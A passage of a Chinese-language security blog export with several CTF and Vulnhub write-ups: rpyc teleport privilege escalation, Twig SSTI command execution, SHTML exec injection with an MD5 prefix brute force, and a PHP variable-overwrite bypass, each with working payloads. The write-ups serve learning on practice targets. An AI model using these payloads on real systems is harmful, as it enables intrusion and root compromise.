<p><strong>冰雹猜想</strong>：一个正整数x，如果是奇数就乘以3再加1，如果是偶数就除以2，这样经过若干个次数，最终回到1。</p>
</blockquote>
<p>推测：该猜想的过程中每一步都会生成一个新的数，直到为1。然后数字可以认为是字符的ascii码。因此我们：</p>
<ol type="1">
<li>找到第29个质数；</li>
<li>通过冰雹猜想，找出每一步的结果；</li>
<li>将结果转为字符</li>
<li>找出其中的<strong>可打印字符</strong></li>
</ol>
<blockquote>
<p>基本的 ASCII 字符集共有 128 个字符，其中有 95 个可打印字符，包括常用的字母、数字、标点符号等，另外还有 33 个控制字符。 在ASCII码中，<strong>第0～31号及第127号(共33个)，换句话说就是小于32的</strong>都是控制字符或通讯专用字符。<strong>第32~126号(共95个)是可打印字符</strong>，也就是在显示器上输出能够看得见的。</p>
</blockquote>
<h2 id="素数查找冰雹猜想">素数查找/冰雹猜想</h2>
<p>根据上面描述，编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primeNumber</span>():</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> count():</span><br><span class="line">        <span class="keyword">if</span> x &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        NotPrime = <span class="number">0</span></span><br><span class="line">        h = x // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, h):</span><br><span class="line">            <span class="keyword">if</span> x % i == <span class="number">0</span>:</span><br><span class="line">                NotPrime = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> NotPrime:</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(n) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(x))</span><br><span class="line">            <span class="keyword">if</span> n == <span class="number">29</span>:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collatz</span>(<span class="params">num</span>):</span></span><br><span class="line">    passwd = <span class="built_in">chr</span>(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> num % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            num = num // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = <span class="number">3</span> * num + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt;= num &lt;= <span class="number">126</span>:</span><br><span class="line">            passwd += <span class="built_in">chr</span>(num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> passwd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(collatz(primeNumber()))</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>运行得到如下结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203036.png" /></p>
<p>最后一行就是全部可打印的字符 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mR)|&gt;^/Gky[gz=\.F#j5P(</span><br></pre></td></tr></table></figure></p>
<h2 id="本地提权rpc提权">本地提权——RPC提权</h2>
<p>尝试使用刚刚得到的字符登录<code>ragnar</code>账号</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203119.png" /></p>
<p>成功登录。如果使用<code>ssh</code>连接，则会出现这样的情况，再次让我们输入密码。奇怪的是为什么刚刚登录却还需要再次输入密码？</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410203550.png" /></p>
<p>输入密码后提示<code>ragnar is not in the sudoers file.  This incident will be reported.</code>，也就是我们没有执行<code>sudo</code>的权限。</p>
<blockquote>
<p><code>/bin/sh</code>转为<code>/bin/bash</code>命令：<code>/bin/bash</code></p>
</blockquote>
<p>综上分析，一定是执行了<code>sudo command</code>，所以才需要输入密码，但是我们只是刚刚登录，所以一定是登录自启动！当命令存储在用户配置文件中时会发生这种情况。（这应该是作者给的提示，如果直接<code>su ragnar</code>则不会有这提示）接下来就去找自启动的配置文件，一般有：</p>
<blockquote>
<p>针对用户：<code>/home/username/.bashrc, /home/username/.profile</code>等 全局：<code>/etc/profile</code></p>
</blockquote>
<p>最后再<code>/etc/ragnar/.profile</code>中发现</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410204219.png" /></p>
<p>查看该文件的权限</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410204434.png" /></p>
<p>发现这个文件是属于root用户，其他用户都可以运行这个文件，但是其他用户没有修改权限。</p>
<p>既然它是服务端开放的一个api接口，我们可以在客户端编写程序代码，通过某些函数提交到服务器端的侦听端口上面，然后让服务器进行执行，服务器是通过root权限执行的，如果我们可以控制这些提交上去的函数使其执行我们的代码，我们就可以获得root权限。</p>
<p>参考链接: <a href="https://rpyc.readthedocs.io/en/latest/index.html">rypc</a></p>
<p>从官网中找到一个方法<code>teleport</code>，该方法允许客户端向服务端传输一个方法，并且在服务端执行该方法，并且官网也给出了这个方法的简单应用。也就是我们可以利用该方法去传输一个自己写的方法用来提权，比如把<code>ragnar</code>加入到sudo组。</p>
<p>将官网给的例子简单修改： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line">conn = rpyc.classic.connect(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">	<span class="keyword">import</span> os</span><br><span class="line">	os.system(<span class="string">&quot;sudo usermod -a -G sudo ragnar&quot;</span>)</span><br><span class="line">fn = conn.teleport(shell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a: append, 添加</span><br><span class="line">-G: Group, 组</span><br><span class="line">-a -G sudo: 加入到sudo组</span><br></pre></td></tr></table></figure>
<p>执行该程序，然后重新连接一下<code>ragnar</code>，然后用<code>sudo -s</code>，以root执行shell。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410205645.png" /></p>
<p>成功拿到root权限。然后读取<code>/root</code>下的flag文件即可。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f0b98d4387ff6da77317e582da98bf31</span><br></pre></td></tr></table></figure></p>
<p>这里的RPC提权还有其他的利用方式，比如在自己的主机生成公私钥，然后在靶机上创建<code>/root/.ssh</code>，并把私钥复制进去，之后就能使用公钥登录；还可以利用<code>rypc</code>的eval 和 execute 方法直接反弹shell。</p>
<p>我整理一下：</p>
<ol type="1">
<li>我们登录到ragnar用户；<br />
</li>
<li>ragnar自启动该程序，并执行我们的添加普通用户到sudo组的命令<br />
</li>
<li>获得sudo权限</li>
</ol>
<p>问题：ragnar应该没有权限执行添加普通用户到sudo组的命令吧？</p>
<p>解答：</p>
<p>其实只要开机，该脚本都会执行，因为该脚本的开机自启动写在了<code>/etc/init.d/rpyc</code>中。而<code>/home/ragnar/.profile</code>应该只是写出来给我们一个提示！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410214605.png" /></p>
<p>原本的执行权限为<code>755</code>。我将它修改为<code>744</code>，然后重新启动，发现该脚本还是被执行了，又因为ragnar没有sudo权限无法执行，所以只有可能被root执行。也就是说，无论登录的是哪个用户，只要这台靶机开机，该脚本都会以root权限执行，那么自然就能够执行添加普通用户到sudo组的命令了。</p>
<h1 id="总结">总结</h1>
<p>通过对该靶机的渗透，学到了一下新的知识点：</p>
<ol type="1">
<li>二进制信息查看</li>
<li>隐写术知识点</li>
<li>rpyc提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>隐写术</tag>
        <tag>二进制信息查看</tag>
        <tag>rypc提权</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF20 Cookie is so stable</title>
    <url>/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>首先注意到本题的题目是“Cookie is so stable”，说明该题应该跟cookie相关。提到cookie，一般有以下思路：</p>
<ul>
<li>利用cookie来伪装成管理员或者其他账号</li>
<li>利用cookie进行注入，比如sql注入</li>
</ul>
<p>进入环境，首先查看了源码，发现了三个文件</p>
<ol type="1">
<li><code>index.php</code></li>
<li><code>flag.php</code></li>
<li><code>hint.php</code></li>
</ol>
<p>依次进行了查看，index.php就是进入环境看到的界面；hint.php源码中有一句提示<code>Why not take a closer look at cookies?</code>；flag.php 界面有一个输入框，猜测这里输入，然后cookie就会被设置为对应的值。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405091727.png" /></p>
<h1 id="解题">解题</h1>
<p>输入admin之后，还以为其他界面会发生变化，结果跟原来一样。抓包看看，发现cookie中确实多了 <code>user=admin</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405091854.png" /></p>
<p>起初，我还以为是要猜admin的cookie值，就把0，1，admin，root，administrator等都试了一遍，发现没有任何变化。</p>
<p>然后我想到了sql注入，尝试了一下发现无论输入什么也没有报错，单引号、双引号，括号都无法闭合。因此，就放弃了sql注入。</p>
<p>最后的最后，想到了还有一种注入，那就是模板注入——SSTI。所以将<code>user=&#123;&#123;7*7&#125;&#125;</code>带入，发现成功被执行！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092245.png" /></p>
<p>因此，接下来就需要判断以下模板引擎是什么，根据决策树</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>此时<code>&#123;&#123;7*7&#125;&#125;</code>已经成功被执行，此时需要走绿线，尝试<code>&#123;&#123;7*'7'&#125;&#125;</code>，如果结果为<code>49</code>则是Twig，如果结果是<code>7777777</code>，则是Jinjia2。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092437.png" /></p>
<p>因此，模板引擎为Twig。</p>
<p><strong>Twig有三个版本 1.x，2.x，3.x，三者的主要区别就是<code>_self</code>作用发生了变化</strong>。因此，使用如下payload判断一下版本。可以参考一下：<a href="https://hdfzzf.icu/2022/04/05/Twig模板注入/">Twig模板注入</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092951.png" /></p>
<p>成功被执行，因此Twig版本为1.x 。</p>
<p>接下来就很简单了，使用如下payload查看根目录 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo `ls /`&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里需要注意的是不能直接 <code>ls /</code>，这样子只能返回一行结果，而根目录下的文件或目录有很多，我们需要知道全部以确定flag是否在。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405093154.png" /></p>
<p>找到flag。接下来读取 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo `cat /flag`&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405093236.png" /></p>
<p>成功。</p>
<h1 id="总结">总结</h1>
<p>本题考察的主要是模板注入中的Twig模板引擎，主要的难点就是<strong>区分模板引擎</strong>。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Twig SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <url>/2022/04/19/BJDCTF2020%20EasySearch/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BBJDCTF2020%5DEasySearch">EasySearch</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境之后，看到的就是一个登陆界面，查看源码、抓包都没有任何有用的信息，尝试对登陆界面进行SQL注入也没有结果。所以打算进行路径扫描，结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">200 index.php </span><br><span class="line">200 index.php/login</span><br><span class="line">403 /public/  </span><br><span class="line">403 /server-status</span><br><span class="line">403 /server-status/</span><br><span class="line">403 /cgi-bin/</span><br></pre></td></tr></table></figure></p>
<p>最开始还以为是403 Bypass，但是经过尝试，发现行不通。最后实在没办法去查看了一下别人的WP，发现原来的题目是有提示的，就是<strong>访问<code>index.php.swp</code></strong>。访问该文件，得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];  <span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="解题">2. 解题</h1>
<p>通过代码审计，发现能够利用的就是<code>fwrite($shtml,$text);</code>，将我们输入的username写入文件。通过搜索发现shtml文件可以执行bash命令，格式如下：<code>&lt;!--#exec cmd='[命令]'--&gt;</code>。只需要访问带有对应格式的shtml文件，即可执行文件中的命令。</p>
<p>知道了如何利用之后，我们需要构造payload，也就是需要知道username和password的值。</p>
<p>因为<code>fwrite($shtml,$text);</code>以及text的内容，得知username的值就是我们需要执行的bash命令。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">         $text = &#x27;</span><br><span class="line">         ***</span><br><span class="line">         ***</span><br><span class="line">         &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">         ***</span><br><span class="line">***&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>接着确定password的值。通过<code>if ( $admin == substr(md5($_POST['password']),0,6))</code>了解到，输入的password经过md5加密后取其前6位字符构成的子串，该子串必须与$admin相等，也就是前6个字符必须为<code>6d0bc1</code>。直接编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start!&quot;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():   <span class="comment"># 从0开始一直累加</span></span><br><span class="line">    h = md5(<span class="built_in">str</span>(i).encode()).hexdigest()  <span class="comment"># MD5加密</span></span><br><span class="line">    <span class="keyword">if</span> h[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find it! the password is: &quot;</span> + <span class="built_in">str</span>(i))  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>最终找到password=2020666。因此： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;find / -name flag*&#x27;--&gt;&amp;password=2020666 -&gt; 找flag文件</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114737.png" /></p>
<p>访问shtml文件：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114915.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&#x27;--&gt;&amp;password=2020666 -&gt; get flag</span><br></pre></td></tr></table></figure>
<p>同样的，访问对应的shtml文件，得到flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115013.png" /></p>
<h1 id="参考">3. 参考</h1>
<ul>
<li><a href="https://www.cnblogs.com/Areas/p/5096899.html">SHTML 教程 - Areas - 博客园</a></li>
<li><a href="https://imagin.vip/?p=166">BJDCTF Web Write Up – Imagin's Blog</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>MD5碰撞</tag>
        <tag>shtml命令执行</tag>
        <tag>vim泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 Mark loves cat</title>
    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现 url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在 <code>.git</code> 泄露。（我用 <code>dirsearch</code> 扫不出来，不知道为什么。）</p>
<h1 id="解题">解题</h1>
<p>将源码下载后查看了发现了两个 php 文件。</p>
<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
<p>接下来进行代码审计。</p>
<blockquote>
<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入 flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
</blockquote>
<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的 if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得 flag。</p>
<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数 <code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code> 该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
<ol type="1">
<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
<li><code>$yds=$flag</code></li>
<li>`<code>$is=$flag</code></li>
</ol>
<p>看思路1，我们需要get方式传入 <code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
<p>看思路2，这个是最简单的，只需要get方式传入 <code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个 <code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使 <code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为 <code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>git泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 The mystery of ip</title>
